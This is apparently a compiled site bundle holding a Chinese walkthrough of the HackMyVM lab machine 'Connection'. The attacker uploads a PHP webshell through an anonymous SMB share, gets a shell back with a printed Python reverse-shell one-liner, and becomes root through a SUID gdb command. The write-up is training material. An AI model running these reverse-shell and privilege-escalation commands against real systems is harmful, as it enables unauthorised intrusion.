"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4182],{33499:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>h,frontMatter:()=>i,metadata:()=>c,toc:()=>o});var t=s(85893),a=s(11151);const i={},r="Connection",c={id:"HackMyVM/Machines/Connection/index",title:"Connection",description:"[Linux VM] [Tested on VirtualBox] created by || whitecr0wz",source:"@site/docs/HackMyVM/Machines/Connection/index.md",sourceDirName:"HackMyVM/Machines/Connection",slug:"/HackMyVM/Machines/Connection/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Connection/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Connection/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Choc",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Choc/"},next:{title:"Darkside",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Darkside/"}},l={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u5229\u7528 smb \u670d\u52a1",id:"\u5229\u7528-smb-\u670d\u52a1",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u8fdb\u4e00\u6b65\u7a33\u5b9a shell \u52a0\u4ee5\u5229\u7528",id:"\u8fdb\u4e00\u6b65\u7a33\u5b9a-shell-\u52a0\u4ee5\u5229\u7528",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5229\u7528 gdb \u8fdb\u884c\u63d0\u6743",id:"\u5229\u7528-gdb-\u8fdb\u884c\u63d0\u6743",level:2},{value:"root pwned",id:"root-pwned",level:2}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"connection",children:"Connection"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || whitecr0wz"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-09-25"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 530e8d12ae6fc543a13971d6ca4549fb"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 318"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 316"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nNice and easy VM ;)"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(78906).Z+"",width:"1020",height:"687"})}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.106\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.106\nHost is up (0.00036s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 b7e601b5f906a1ea40042944f4df22a1 (RSA)\n|   256 fb1694df9389c7568584229ea0be7c95 (ECDSA)\n|_  256 452efb8704ebd18b926f6aea5aa2a11c (ED25519)\n80/tcp  open  http        Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\nMAC Address: 08:00:27:F1:44:FD (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb2-security-mode:\n|   311:\n|_    Message signing enabled but not required\n|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s\n| smb2-time:\n|   date: 2023-12-23T02:03:57\n|_  start_date: N/A\n|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.9.5-Debian)\n|   Computer name: connection\n|   NetBIOS computer name: CONNECTION\\x00\n|   Domain name: \\x00\n|   FQDN: connection\n|_  System time: 2023-12-22T21:03:57-05:00\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"web /",src:s(21121).Z+"",width:"1055",height:"527"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c31\u662f Debian \u7684\u9ed8\u8ba4\u9875\u9762\uff0c\u5e76\u4e14\u76ee\u5f55\u7206\u7834\u626b\u63cf\u6ca1\u6709\u6709\u4ef7\u503c\u7684\u4fe1\u606f"}),"\n",(0,t.jsx)(n.h2,{id:"\u5229\u7528-smb-\u670d\u52a1",children:"\u5229\u7528 smb \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:"\u5217\u51fa\u670d\u52a1\u5668\u4e0a smb \u670d\u52a1\u7684\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $smbclient --no-pass -L //192.168.56.106\nAnonymous login successful\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        share           Disk\n        print$          Disk      Printer Drivers\n        IPC$            IPC       IPC Service (Private Share for uploading files)\nSMB1 disabled -- no workgroup available\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0\u4e00\u4e2a ",(0,t.jsx)(n.code,{children:"share"})," \u76ee\u5f55\uff0c\u8fdb\u5165\u7ec8\u7aef\u67e5\u770b\u5185\u5bb9"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $smbclient -N \\\\\\\\192.168.56.106/share\nAnonymous login successful\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Sep 23 09:48:39 2020\n  ..                                  D        0  Wed Sep 23 09:48:39 2020\n  html                                D        0  Wed Sep 23 10:20:00 2020\n\n                7158264 blocks of size 1024. 5438556 blocks available\nsmb: \\> cd html\nsmb: \\html\\> ls\n  .                                   D        0  Wed Sep 23 10:20:00 2020\n  ..                                  D        0  Wed Sep 23 09:48:39 2020\n  index.html                          N    10701  Wed Sep 23 09:48:45 2020\n\n                7158264 blocks of size 1024. 5438556 blocks available\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u53ef\u4ee5\u63a8\u65ad\u8fd9\u4e2a\u76ee\u5f55\u4e3a web \u670d\u52a1\u7684\u5de5\u4f5c\u76ee\u5f55\uff0c\u5c1d\u8bd5\u5199 php \u9a6c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"smb: \\html\\> put webshell.php\nputting file webshell.php as \\html\\webshell.php (7.8 kb/s) (average 7.8 kb/s)\nsmb: \\html\\> ls\n  .                                   D        0  Sat Dec 23 10:24:12 2023\n  ..                                  D        0  Wed Sep 23 09:48:39 2020\n  index.html                          N    10701  Wed Sep 23 09:48:45 2020\n  webshell.php                        A       32  Sat Dec 23 10:24:12 2023\n\n                7158264 blocks of size 1024. 5438540 blocks available\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee web \u670d\u52a1\uff0c\u53d1\u73b0\u53ef\u4ee5\u88ab\u6b63\u5e38\u89e3\u6790"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Connection]\n\u2514\u2500\u2500\u257c $http get 192.168.56.106/webshell.php\nHTTP/1.1 200 OK\nConnection: Keep-Alive\nContent-Length: 0\nContent-Type: text/html; charset=UTF-8\nDate: Sat, 23 Dec 2023 02:25:00 GMT\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.38 (Debian)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8681\u5251\u8fde\u63a5\uff0c\u6210\u529f getshell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8681\u5251 \u6210\u529f\u8fde\u63a5",src:s(67099).Z+"",width:"1026",height:"692"})}),"\n",(0,t.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8681\u5251 /home/connection/local.txt",src:s(95320).Z+"",width:"1026",height:"692"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/connection/local.txt"',children:"3f491443a2a6aa82bc86a3cda8c39617\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u8fdb\u4e00\u6b65\u7a33\u5b9a-shell-\u52a0\u4ee5\u5229\u7528",children:"\u8fdb\u4e00\u6b65\u7a33\u5b9a shell \u52a0\u4ee5\u5229\u7528"}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u63d2\u4ef6\uff0c\u6267\u884c\u53cd\u5f39 shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8681\u5251 \u53cd\u5f39 shell",src:s(77171).Z+"",width:"1026",height:"692"})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Connection]\n\u2514\u2500\u2500\u257c $nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 37550\nwhoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5e76\u5229\u7528 pwncat-cs \u8fdb\u4e00\u6b65\u7a33\u5b9a shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'python3 -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u7a33\u5b9a shell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"pwncat-cs \u6536\u5230\u56de\u8fde shell",src:s(49371).Z+"",width:"1106",height:"754"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"bash: sudo: command not found\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/gdb\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/mount\n/usr/bin/gpasswd\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728 suid \u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u5229\u7528-gdb-\u8fdb\u884c\u63d0\u6743",children:"\u5229\u7528 gdb \u8fdb\u884c\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'(remote) www-data@connection:/var/www/html$ gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit\nGNU gdb (Debian 8.2.1-2+b3) 8.2.1\nCopyright (C) 2018 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType "show copying" and "show warranty" for details.\nThis GDB was configured as "x86_64-linux-gnu".\nType "show configuration" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type "help".\nType "apropos word" to search for commands related to "word".\n[](remote)[] []root@connection[]:[]/var/www/html[]$ whoami\nroot\n'})}),"\n",(0,t.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/root/proof.txt"',children:"a7c6ea4931ab86fb54c5400204474a39\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},78906:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231203-100315-067dd3865a19882712c7ee1e7871a4b4.png"},21121:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231207-100701-c60dbc4a8c93287a2f77bdf233b22c58.png"},67099:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231226-102601-5a01d123ce0b2e251c830fdfa6a13a09.png"},95320:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231226-102644-ba7ee86773b0f707c4f5450da13413ab.png"},77171:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231228-102843-4a7067e700ab6eea74cd4bea177119ef.png"},49371:(e,n,s)=>{s.d(n,{Z:()=>t});const t=s.p+"assets/images/image_20231232-103248-aa94e6e9a8bf414a0c5fdc11bf2dd518.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>r});var t=s(67294);const a={},i=t.createContext(a);function r(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);